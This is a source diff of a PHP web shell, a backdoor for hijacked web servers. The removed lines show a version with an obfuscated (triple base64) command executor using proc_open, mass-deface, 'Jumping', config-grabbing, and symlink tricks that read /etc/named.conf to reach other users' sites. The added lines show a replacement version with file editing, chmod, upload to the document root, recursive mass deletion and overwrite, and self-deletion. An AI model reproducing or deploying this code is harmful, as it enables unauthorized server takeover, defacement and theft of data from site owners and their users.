+            $path = $dir . DIRECTORY_SEPARATOR . $file;
+            if ($file === '.' || filetype($path) == 'file') {
+                if (
+                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
+                        0 &&
+                    @preg_match(
+                        "/" . $file . "$/",
+                        $_SERVER['PHP_SELF'],
+                        $matches
+                    ) != 1
+                ): ?>
+                    <tr>
+                        <td>
+                            <div class="alert alert-success">
+                                <?= $dir .
+                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Delete Successfully !</b>
+                            </div>
+                        </td>
+                    </tr>
+                    <?php unlink($path);endif;
+            } elseif ($file === '..' || filetype($path) == 'file') {
+                if (
+                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
+                        0 &&
+                    @preg_match(
+                        "/" . $file . "$/",
+                        $_SERVER['PHP_SELF'],
+                        $matches
+                    ) != 1
+                ): ?>
+                    <tr>
+                        <td>
+                            <div class="alert alert-success">
+                                <?= $dir .
+                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Delete Successfully !</b>
+                            </div>
+                        </td>
+                    </tr>
+                    <?php unlink($path);endif;
+            } else {
+                if (is_dir($path)) {
+                    if (is_writable($path)) {
+                        @unlink($path);
+                        massdelete($path, $type);
+                    }
+                }
+            }
+        }
+    }
+}
+function making($post)
+{
+    if ($_GET['do'] == 'making') { ?>
+    <thead>
+      <tr>
+        <th colspan="2">
+          <a class="back" href="?path=<?php print @cwd(); ?>">MAKE FILE & DIRECTORY</a>
+        </th>
+      </tr>
+    </thead>
+    <?php if (isset($_POST['submit'])) {
+        if ($_POST['type'] == 'file') {
+            switch ($_POST['file_name']) {
+                case 'txt':
+                    $_mode = "txt";
+                    break;
+                case 'html':
+                    $_mode = "html";
+                    break;
+                case 'php':
+                    $_mode = "php";
+                    break;
+                case 'css':
+                    $_mode = "css";
+                    break;
+                case 'asp':
+                    $_mode = "asp";
+                    break;
+                case 'js':
+                    $_mode = "js";
+                    break;
+                case 'python':
+                    $_mode = "py";
+                    break;
+                case 'perl':
+                    $_mode = "pl";
+                    break;
+            }
+            if (
+                @makefile($_POST['filename'] . "." . $_mode, $_POST['text'])
+            ) { ?>
+          <tr>
+            <td colspan="2">
+              <?php print @failed(
+                  "Create File <b>" .
+                      $_POST['filename'] .
+                      "." .
+                      $_mode .
+                      "</b> Failed"
+              ); ?>
+            </td>
+          </tr>
+          <?php } else { ?>
+          <tr>
+            <td colspan="2">
+              <?php print @success(
+                  "Create File <b>" .
+                      $_POST['filename'] .
+                      "." .
+                      $_mode .
+                      "</b> Successfully"
+              ); ?>
+            </td>
+          </tr>
+          <?php }
+        }
+        if ($_POST['type'] == 'dir') {
+            if (@makedir($_POST['filename'])) { ?>
+          <tr>
+            <td>
+              <?php print @success(
+                  "Create DIRECTORY " . $_POST['filename'] . " Successfully"
+              ); ?>
+              <?php print sleep(7); ?>
+              <?php print flush(); ?>
+              <?php print @header(
+                  "Location : ?path=" .
+                      @cwd() .
+                      DIRECTORY_SEPARATOR .
+                      $_POST['filename'] .
+                      ""
+              ); ?>
+            </td>
+          </tr>
+          <?php } else { ?>
+          <tr>
+            <td>
+              <?php print @failed(
+                  "Create DIRECTORY " . $_POST['filename'] . " Failed"
+              ); ?>
+            </td>
+          </tr>
+          <?php }
+        }
+    } ?>
+    <form method="post">
+      <tr>
+        <td colspan="2">
+          <select style="width:100%;" name="type">
+            <option value="file">FILE</option>
+            <option value="dir">DIRECTORY</option>
+          </select>
+        </td>
+      </tr>
+      <tr>
+        <td style="width:50px;">
+          <select name="file_name">
+            <option value="txt">txt</option>
+            <option value="html">html</option>
+            <option value="php">php</option>
+            <option value="css">css</option>
+            <option value="asp">asp</option>
+            <option value="js">js</option>
+            <option value="python">python</option>
+            <option value="perl">pl</option>
+          </select>
+        </td>
+        <td>
+          <center>
+          <input style="width:98.8%;" type="text" name="filename" placeholder="Filename: ">
+        </center>
+        </td>
+      </tr>
+      <tr>
+        <td colspan="2">
+          <textarea name="text" placeholder="sfx* please empty this textarea if you want create DIRECTORY"></textarea>
+        </td>
+      </tr>
+      <tr>
+        <td colspan="2">
+          <input style="width:100%;" type="submit" name="submit">
+        </td>
+      </tr>
+    </form>
+    <?php exit();}
+}
+function upload($post)
+{
+    if ($_GET['do'] == $post) {
+        if (isset($_POST['submit'])) {
+            if ($_POST['type'] == 'biasa') {
+                if (
+                    @copy(
+                        $_FILES['file']['tmp_name'],
+                        @cwd() . DIRECTORY_SEPARATOR . $_FILES['file']['name']
+                    )
+                ) { ?>
+          <tr>
+            <td>
+              <?php print @success("Upload Success"); ?>
+            </td>
+          </tr>
+          <?php } else { ?>
+          <tr>
+            <td>
+              <?php print @failed("Upload Failed"); ?>
+            </td>
+          </tr>
+          <?php }
+            }
+            if ($_POST['type'] == 'root') {
+                $root = $_SERVER['DOCUMENT_ROOT'];
+                if (
+                    @copy(
+                        $_FILES['file']['tmp_name'],
+                        $root . DIRECTORY_SEPARATOR . $_FILES['file']['name']
+                    )
+                ) { ?>
+          <tr>
+            <td>
+              <?php print @success("Upload Success"); ?>
+            </td>
+          </tr>
+          <?php } else { ?>
+          <tr>
+            <td>
+              <?php print @failed("Upload Failed"); ?>
+            </td>
+          </tr>
+          <?php }
+            }
+        } ?>
+    <thead>
+        <tr>
+          <th>
+            <a class="back" href="?path=<?php print @cwd(); ?>">UPLOAD FILE</a>
+          </th>
+        </tr>
+      </thead>
+    <form method="post" enctype="multipart/form-data">
+      <tr>
+        <td>
+          <div align="center">
+            <input id="option" type="radio" name="type" value="biasa" checked="checked">
+            <label for="option"><span><span></span></span>biasa
+            ( <?php print @permission(@cwd(), "Writable"); ?> )
+            </label>
+            <input id="option" type="radio" name="type" value="root">
+            <label for="option"><span><span></span></span>home_root
+            ( <?php print @permission($_SERVER['DOCUMENT_ROOT'], "Writable"); ?>
+            </label>
+        </div>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <center>
+          <input type="file" name="file">
+          <input style="width:100px;" type="submit" name="submit" value="Upload">
+          </center>
+        </td>
+      </tr>
+    </form>
+    <?php exit();
+    }
+}
+function edit($post, $filename)
+{
+    if ($_GET['do'] == $post) {
+
+        if (isset($_POST['submit'])) {
+            $fp = @fopen($filename, "w");
+            if (@fwrite($fp, $_POST['text'])) { ?>
+        <tr>
+            <td>
+                <?php print @success("Saved"); ?>
+            </td>
+        </tr>
+        <?php } else { ?>
+        <tr>
+            <td>
+                <?php print @failed("Failed"); ?>
+            </td>
+        </tr>
+        <?php }
+        }
+        $text = @htmlspecialchars(@file_get_contents($filename));
+        ?>
+    <thead>
+      <tr>
+        <th>
+          <a class="back" href="?path=<?php print @cwd(); ?>">EDIT</a>
+        </th>
+      </tr>
+      <tr>
+        <th>Filename : <?php print @permission(
+            $filename,
+            @basename($filename)
+        ); ?></th>
+      </tr>
+    </thead>
+    <form method="post">
+      <tr>
+        <td>
+          <textarea name="text"><?php print $text; ?></textarea>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <input style="width:100%;" type="submit" name="submit" value="SAVE">
+        </td>
+      </tr>
+    </form>
+    <?php exit();
+    }
+}
+function renames($post, $filename)
+{
+    if ($_GET['do'] == $post) {
+        if (isset($_POST['submit'])) {
+            if (@rename($filename, $_POST['newname'])) { ?>
+        <tr>
+            <td>
+                <?php print @success("Rename Success"); ?>
+            </td>
+        </tr>
+        <?php } else { ?>
+        <tr>
+            <td>
+                <?php print @failed("Rename Failed"); ?>
+            </td>
+        </tr>
+        <?php }
+        } ?>
+    <thead>
+      <tr>
+        <th>
+          <a class="back" href="?path=<?php print @cwd(); ?>">RENAME</a>
+        </th>
+      </tr>
+    </thead>
+    <form method="post">
+      <tr>
+        <td>
+          <input style="width:98.6%;" type="text" name="newname" value="<?php print @basename(
+              $filename
+          ); ?>">
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <input style="width:100%;" type="submit" name="submit" value="RENAME">
+        </td>
+      </tr>
+    </form>
+    <?php exit();
+    }
+}
+function chmods($post, $filename)
+{
+    if ($_GET['do'] == $post) {
+        if (isset($_POST['submit'])) {
+            if (@chmod($filename, $_POST['mode'])) { ?>
+        <tr>
+            <td>
+                <?php print @success("Chmod Success"); ?>
+            </td>
+        </tr>
+        <?php } else { ?>
+        <tr>
+            <td>
+                <?php print @failed("Chmod Failed"); ?>
+            </td>
+        </tr>
+        <?php }
+        } ?>
+    <thead>
+      <tr>
+        <th>
+          <a class="back" href="?path=<?php print @cwd(); ?>">CHANGE MODE</a>
+        </th>
+      </tr>
+    </thead>
+    <form method="post">
+      <tr>
+        <td>
+          <input style="width:98.5%;" type="text" name="mode" value="<?php print @substr(
+              sprintf('%o', @fileperms($filename)),
+              -4
+          ); ?>">
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <input style="width:100%;" type="submit" name="submit">
+        </td>
+      </tr>
+    </form>
+    <?php exit();
+    }
+}
+function delete($filename)
+{
+    if (@is_dir($filename)) {
+        $scandir = @scandir($filename);
+        foreach ($scandir as $object) {
+            if ($object != '.' && $object != '..') {
+                if (@is_dir($filename . DIRECTORY_SEPARATOR . $object)) {
+                    @delete($filename . DIRECTORY_SEPARATOR . $object);
+                } else {
+                    @unlink($filename . DIRECTORY_SEPARATOR . $object);
+                }
+            }
+        }
+        if (@rmdir($filename)) {
+            return true;
         } else {
-            unlink($path);
-        }
-    }
-    rmdir($dir);
-}
-
-function dunlut($file) {
-    if (!is_readable($file)) {
-        red("Cannot Download File / Unreadable File !");
-        die();
-    }
-    header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename="'.basename($file).'"');
-    header('Expires: 0');
-    header('Cache-Control: must-revalidate');
-    header('Pragma: public');
-    header('Content-Length: ' . filesize($filepath));
-    flush();
-    readfile($file);
-    die();
-}
-
-function owner($file) {
-    if (function_exists("posix_getpwuid")) {
-        $tod = @posix_getpwuid(fileowner($file));
-        return "<center>".$tod['name']."</center>";
-    } else {
-        return "<center>".fileowner($file)."</center>";
-    }
-}
-
-function cekwrite($lokasi) {
-    $izin = substr(sprintf('%o', fileperms($lokasi)), -4);
-    if (is_writable($lokasi)) {
-        return "<font color=green>".$izin."</font>";
-    } else {
-        return "<font color=red>".$izin."</font>";
-    }
-}
-
-function ekse($komend, $lokasi) {
-    if (!function_exists("proc_open")) {
-        die("proc_open function disabled !");
-    } elseif (!function_exists("base64_decode")) {
-        die("base64_decode function disabled !");
-    }
-    $komen = base64_decode(base64_decode(base64_decode($komend)));
-    $tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pipes, $lokasi);
-    echo "<textarea rows='25' cols='100'>".htmlspecialchars(stream_get_contents($pipes[1]))."</textarea><br><br>";
-}
-
-function ipserv() {
-    if (empty($_SERVER['SERVER_ADDR'])) {
-        return gethostbyname($_SERVER['SERVER_NAME']);
-        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
-            return $_SERVER['SERVER_NAME'];
+            return false;
         }
     } else {
-        return $_SERVER['SERVER_ADDR'];
+        if (@unlink($filename)) {
+            return true;
+        } else {
+            return false;
+        }
     }
 }
+function download($post, $filename)
+{
+    if ($_GET['do'] == $post) {
+        @ob_clean();
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header(
+            'Content-Disposition: attachment; filename="' .
+                basename($filename) .
+                '"'
+        );
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($filename));
+        readfile($filename);
 
-function cekfile($file) {
-     return '<i class="fa fa-file" style="color: #d6d4ce"></i> ';
-}
-
-function filedate($file) {
-    return date("F d Y g:i:s", filemtime($file));
-}
-
-function unzip($file, $lokasi) {
-    if (!is_readable($file)) {
-        red("Cannot Unzip File / Unreadable File !");
-        die();
-    } elseif (strpos(file_get_contents($file), "\x50\x4b\x03\x04") === false) {
-        red("This isn't Zip File !");
-        die();
-    }
-    $zip = new ZipArchive;
-    $res = $zip -> open($file);
-    if ($res == true) {
-        $zip -> extractTo($lokasi);
-        $zip -> close();
-        green("Success Unzip File !");
-    } else {
-        red("Failed to Unzip File !");
+        @readfile($filename);
+        exit(0);
     }
 }
-
-function green($text) {
-    echo "<center><font color='green'>".$text."</center></font>";
+function backup($post, $filename)
+{
+    if ($_GET['do'] == $post) {
+        $file = @file_get_contents($filename);
+        $fp = @fopen($filename . ".bak", "w");
+        @fwrite($fp, $file);
+        @fclose($fp);
+    }
 }
-
-function red($text) {
-    echo "<center><font color='red'>".$text."</center></font>";
+function killme($post)
+{
+    if ($_GET['do'] == 'killme') {
+        $killme = unlink(@cwd() . DIRECTORY_SEPARATOR . $_SERVER['PHP_SELF']);
+        if ($killme) { ?>
+      <tr>
+        <td colspan="5">
+          <?php print @success("Good Bye :)"); ?>
+          <?php print @home(); ?>
+        </td>
+      </tr>
+      <?php exit();} else { ?>
+      <tr>
+        <td colspan="5">
+          <?php print @failed("Permission Danied"); ?>
+        </td>
+      </tr>
+      <?php exit();}
+    }
 }
-
-if (function_exists("mysql_connect")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
+function home()
+{
+    $home =
+        "http://" .
+        $_SERVER['HTTP_HOST'] .
+        $_SERVER['SCRIPT_NAME'] .
+        ""; ?> <script type="text/javascript">window.location='<?php print $home; ?>';</script> <?php
 }
-echo " &nbsp;|&nbsp; cURL : ";
-if (function_exists("curl_init")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
+function logout($post)
+{
+    if ($_GET['do'] == 'logout') {
+        unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
+        @home();
+    }
 }
-echo " &nbsp;|&nbsp; WGET : ";
-if (file_exists("/usr/bin/wget")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
+if (isset($_GET['home'])) {
+    @home();
 }
-echo " &nbsp;|&nbsp; Perl : ";
-if (file_exists("/usr/bin/perl")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
+if ($_GET['do'] == 'delete') {
+    if (@delete($_GET['file'])) {
+        header("Location: ?" . cwd() . "");
+    }
 }
-echo " &nbsp;|&nbsp; Python : ";
-if (file_exists("/usr/bin/python2")) {
-    echo "<font color=green>ON</font>";
-} else {
-    echo "<font color=red>OFF</font>";
-}
-
-foreach($_POST as $key => $value){
-    $_POST[$key] = stripslashes($value);
-}
-
-if(isset($_GET['path'])){
-    $lokasi = $_GET['path'];
-    $lokdua = $_GET['path'];
-} else {
-    $lokasi = getcwd();
-    $lokdua = getcwd();
-}
-
-$lokasi = str_replace('\\','/',$lokasi);
-$lokasis = explode('/',$lokasi);
-$lokasinya = @scandir($lokasi);
-
-echo "<br>Directory (".cekwrite($lokasi).") : &nbsp;";
-
-foreach($lokasis as $id => $lok){
-    if($lok == '' && $id == 0){
-        $a = true;
-        echo '<a href="?path=/">/</a>';
+@edit("edit", $_GET['file']);
+@renames("rename", $_GET['file']);
+@chmods("chmod", $_GET['file']);
+@backup("backup", $_GET['file']);
+@download("download", $_GET['file']);
+@upload("upload");
+@making("making");
+@masswriter("masswrite");
+@killme("killme");
+@logout('logout');
+?>
+  <thead>
+    <tr>
+      <th colspan="5">
+	  <H1><center><img src="https://media.tenor.com/nlXsoxHvGvsAAAAj/vampire-lana-del-rey.gif"/>
+</center></H1>
+ <H2>2024</H2>
+        System : <?php print @php_uname(); ?>
+      </th>
+    </tr>
+    <tr>
+      <th colspan="5">
+        <a class="tools" href="?path=<?php print @cwd(); ?>&home">Home</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&encode">Encode</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&do=upload">Upload</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&do=making">Make File</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&do=masswrite">Replace File</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&do=killme">Kill Me</a>
+        <a class="tools" href="?path=<?php print @cwd(); ?>&do=logout">Logout</a>
+      </th>
+    </tr>
+    <tr>
+      <th colspan="5">
+            <?php print pwd(); ?> ( <?php permission(cwd(), perms(cwd())); ?> )
+      </th>
+    </tr>
+  </thead>
+  <tbody>
+<?php
+$getPATH = @scandir(@cwd());
+foreach ($getPATH as $dir) {
+    if (!is_dir($dir) || $dir === '.' || $dir === '..') {
         continue;
-    }
-    if($lok == '') continue;
-    echo '<a href="?path=';
-    for($i=0;$i<=$id;$i++){
-    echo "$lokasis[$i]";
-    if($i != $id) echo "/";
-} 
-echo '">'.$lok.'</a>/';
+    } ?>
+  <tr class="hover">
+    <td class="img"> 
+      <img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
+    </td>
+    <td>
+      <a href="?path=<?php print @cwd() .
+          DIRECTORY_SEPARATOR .
+          $dir; ?>"><?php print $dir; ?></a>
+    </td>
+    <td>
+      <center>
+        <?php print @permission($dir, @perms($dir)); ?>
+      </center>
+    </td>
+    <td>
+      <center>NaN</center>
+    </td>
+    <td>
+      <center>
+      <select style="float:right;" onclick="if (this.value) window.location=(this.value)">
+        <option value="" selected>Choose . .</option>
+        <option value="?path=<?php print @cwd(); ?>&do=rename&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $dir; ?>">Rename</option>
+        <option value="?path=<?php print @cwd(); ?>&do=delete&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $dir; ?>">Delete</option>
+        <option value="?path=<?php print @cwd(); ?>&do=chmod&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $dir; ?>">Chmod</option>
+      </select>
+    </center>
+    </td>
+  </tr>
+  <?php
 }
-
-echo '</td></tr><tr><td>';
-if (isset($_POST['upwkwk'])) {
-    if ($_POST['dirnya'] == "2") {
-            $lokasi = $_SERVER['DOCUMENT_ROOT'];
-        }
-    if (isset($_POST['berkasnya'])) {
-        $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
-        if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
-            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
-        } else {
-            echo "<font color='red'>Failed to Upload !<br><br>";
-        }
-    } elseif (isset($_POST['linknya'])) {
-        if (empty($_POST['namalink'])) {
-            exit("Filename cannot be empty !");
-        }
-        if ($_POST['dirnya'] == "2") {
-            $lokasi = $_SERVER['DOCUMENT_ROOT'];
-        }
-        $data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
-        if (file_exists($lokasi."/".$_POST['namalink'])) {
-            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
-        } else {
-            echo "<font coloe='red'>Failed to Upload !<br><br>";
-        }
-    } elseif (isset($_POST['bepas'])) {
-        $bepasdata = $_POST['bepasdata'];
-        $bepasnama = $_POST['bepasnama'];
-        if ($bepasdata) {
-            echo "string";
-        }
-        @file_put_contents($lokasi."/".$bepasnama, $bepasdata);
-        if (file_exists($lokasi."/".$bepasnama)) {
-            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$bepasnama."</i></font><br><br>";
-        } else {
-            echo "<font coloe='red'>Failed to Upload !<br><br>";
-        }
-    }
+foreach ($getPATH as $file) {
+    if (!is_file($file)) {
+        continue;
+    } ?>
+  <tr class="hover">
+  <?php
+  print "<td class='img'><img src='";
+  $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+  if ($ext == "php") {
+      echo 'https://image.flaticon.com/icons/png/128/337/337947.png';
+  } elseif ($ext == "html") {
+      echo 'https://image.flaticon.com/icons/png/128/136/136528.png';
+  } elseif ($ext == "css") {
+      echo 'https://image.flaticon.com/icons/png/128/136/136527.png';
+  } elseif ($ext == "png") {
+      echo 'https://image.flaticon.com/icons/png/128/136/136523.png';
+  } elseif ($ext == "jpg") {
+      echo 'https://image.flaticon.com/icons/png/128/136/136524.png';
+  } elseif ($ext == "jpeg") {
+      echo 'http://i.imgur.com/e8mkvPf.png"';
+  } elseif ($ext == "zip") {
+      echo 'https://image.flaticon.com/icons/png/128/136/136544.png';
+  } elseif ($ext == "js") {
+      echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
+  } elseif ($ext == "ttf") {
+      echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
+  } elseif ($ext == "otf") {
+      echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
+  } elseif ($ext == "txt") {
+      echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
+  } elseif ($ext == "ico") {
+      echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
+  } elseif ($ext == "conf") {
+      echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
+  } elseif ($ext == "htaccess") {
+      echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
+  } elseif ($ext == "sh") {
+      echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
+  } elseif ($ext == "py") {
+      echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
+  } elseif ($ext == "indsc") {
+      echo 'https://image.flaticon.com/icons/png/512/1265/1265511.png';
+  } elseif ($ext == "sql") {
+      echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
+  } elseif ($ext == "pl") {
+      echo 'http://i.imgur.com/PnmX8H9.png';
+  } elseif ($ext == "pdf") {
+      echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
+  } elseif ($ext == "mp4") {
+      echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
+  } elseif ($ext == "mp3") {
+      echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
+  } elseif ($ext == "git") {
+      echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
+  } elseif ($ext == "md") {
+      echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
+  } else {
+      echo 'https://image.flaticon.com/icons/svg/833/833524.svg';
+  }
+  print "' class='icon'></img></td>";
+  if (strlen($file) > 25) {
+      $_file = substr($file, 0, 25) . "...-." . $ext;
+  } else {
+      $_file = $file;
+  }
+  ?>
+    <td>
+      <?php print $file; ?>
+    </td>
+    </td>
+    <td>
+      <center>
+        <?php print @permission($file, @perms($file)); ?>
+      </center>
+    </td>
+    <td>
+      <center>
+        <?php print @size($file); ?>
+      </center>
+    </td>
+    <td>
+      <center>
+        <select style="float:right;" onclick="if (this.value) window.location=(this.value)">
+        <option value="" selected>Choose . .</option>
+        <option value="?path=<?php print @cwd(); ?>&do=edit&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Edit</option>
+        <option value="?path=<?php print @cwd(); ?>&do=rename&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Rename</option>
+        <option value="?path=<?php print @cwd(); ?>&do=delete&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Delete</option>
+        <option value="?path=<?php print @cwd(); ?>&do=chmod&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Chmod</option>
+        <option value="?path=<?php print @cwd(); ?>&do=backup&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Backup</option>
+        <option value="?path=<?php print @cwd(); ?>&do=download&file=<?php print @cwd() .
+    DIRECTORY_SEPARATOR .
+    $file; ?>">Download</option>
+      </select>
+      </center>
+    </center>
+    </td>
+  </tr>
+  <?php
 }
-
-echo "</table><br>";
-echo '<table width="100%" border="0" cellpadding="5" cellspacing="5" align="center">';
-echo '<th> &nbsp;<a class="button" href="'.$_SERVER['SCRIPT_NAME'].'">Home</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&komend=defacer">&#9741; Command</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&upload=defacer">&#9741; Upload File</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&info=defacer">&#9741;Info Server</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&buatfile=defacer">&#9741; Buat File</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&mass=defacer">&#9741; Mass deface</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&jump=defacer">&#9741; Jumping</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&config=defacer">&#9741; Config</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&symlink=defacer">&#9741; Symlink</a>&nbsp; </th>';
-echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&about=defacer">&#9741; About</a>&nbsp; </th>';
-echo "</table><br>";
-
-if (isset($_GET['fileloc'])) {
-    echo "<tr><td>Current File : ".$_GET['fileloc'];
-    echo '</tr></td></table><br/>';
-    echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
-    author();
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
-    if (is_dir($_POST['path'])) {
-        xrmdir($_POST['path']);
-        if (file_exists($_POST['path'])) {
-            red("Failed to delete Directory !");
-        } else {
-            green("Delete Directory Success !");
-        }
-    } elseif (is_file($_POST['path'])) {
-        @unlink($_POST['path']);
-        if (file_exists($_POST['path'])) {
-            red("Failed to Delete File !");
-        } else {
-            green("Delete File <i>".basename($_POST['path'])."</i> Success !");
-        }
-    }
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
-    if (isset($_POST['gantin'])) {
-        $ren = @rename($_POST['path'], $_POST['newname']);
-        if ($ren == true) {
-            green("Change Name Success !");
-        } else {
-            red("Change Name Failed !");
-        }
-    }
-    if (empty($_POST['name'])) {
-        $namaawal = $_POST['newname'];
-    } else {
-        $namawal = $_POST['name'];
-    }
-    echo "<center>".$_POST['path']."<br>";
-    echo '<form method="post">
-    New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
-    <input type="hidden" name="path" value="'.$_POST['path'].'">
-    <input type="hidden" name="pilih" value="gantinama">
-    <input type="submit" value="Change" name="gantin" class="button" style="cursor: pointer; border-color: #fff"/>
-    </form>';
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
-    if (isset($_POST['gasedit'])) {
-        $edit = @file_put_contents($_POST['path'], $_POST['src']);
-        if ($edit == true) {
-            green("Edit File Success !");
-        } else {
-            red("Edit File Failed !");
-        }
-    }
-    echo "<center>".$_POST['path']."<br><br>";
-    echo '<form method="post">
-    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
-    <input type="hidden" name="path" value="'.$_POST['path'].'">
-    <input type="hidden" name="pilih" value="edit">
-    <input type="submit" value="Edit File" name="gasedit" class="button" />
-    </form><br>';
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "dunlut") {
-    dunlut($_POST['path']);
-} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
-    unzip($_POST['path'], $lokasi);
-} elseif ($_REQUEST['upload'] == "defacer") {
-    echo "<center>Upload File : ";
-    echo '<form enctype="multipart/form-data" method="post">
-<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
-<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
-<br>
-<input type="hidden" name="upwkwk" value="aplod">
-<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
-<br>403 Upload File<br>
-<input type="file" id="datanya" onchange="setfilename(this.value); loadFile(this.files[0])"/>
-<input type="hidden" name="bepasnama" id="namanya">
-<textarea style="display: none" id="bepasdata" name="bepasdata"></textarea>
-<input type="submit" name="bepas" value="Upload" class="up" style="cursor: pointer; border-color: #fff">
-</form><br><br></center>';
-} elseif ($_GET['komend'] == "defacer") {
-    echo "<center>";
-    echo '<form method="post" onsubmit="document.getElementById(\'komendnya\').value = btoa(btoa(btoa(document.getElementById(\'komendnya\').value)))">
-    '.@get_current_user().'@'.ipserv().':~ $ <input type="text" name="komend" id="komendnya" style="background-color: #1f1f1f; color: #fff">
-    <input type="submit" name="eksekomend" value=" >> " class="up" style="cursor: pointer; border-color: #fff">
-    </form><br>';
-    if (isset($_POST['eksekomend'])) {
-        ekse($_POST['komend'], $lokasi);
-    }
-    echo "</center>";
-
-} elseif ($_REQUEST['symlink'] == "defacer") {
-	if (!is_file('named.txt')) {
-        $d00m = @file('/etc/named.conf');
-    } else {
-        $d00m = @file('named.txt');
-    }
-    if (!$d00m) {
-        die("<hr><br><center><a class='button' href='?path=$lokasi&symread=defacer'>Bypass Read</a> <a class='button' href='?path=$lokasi&sym_404=defacer'>Symlink 404</a> <a class='button' href='?path=$lokasi&sym_bypas=defacer'>Symlink Bypass</a><br><br/><font color='red'>Can't read   /etc/named.conf</font><br/><br/></center><br>");
-    } else {
-        echo "[ <a href='?path=$dir&symread=defacer'>Bypass Read</a> ] [ <a href='?path=$lokasi&sym_404=defacer'>Symlink 404</a> ] [ <a href='?path=$lokasi&sym_bypas=defacer'>Symlink Bypass</a> ]<div class='tmp'>
-                <table align='center' width='100%'>
-                    <thead class='bg-info'>
-                        <th>Domains</th>
-                        <th>Users</th>
-                        <th>symlink </th>
-                    </thead>";
-        foreach ($d00m as $dom) {
-            if (eregi('zone', $dom)) {
-                preg_match_all('#zone "(.*)"#', $dom, $domsws);
-                flush();
-                if (strlen(trim($domsws[1][0])) > 2) {
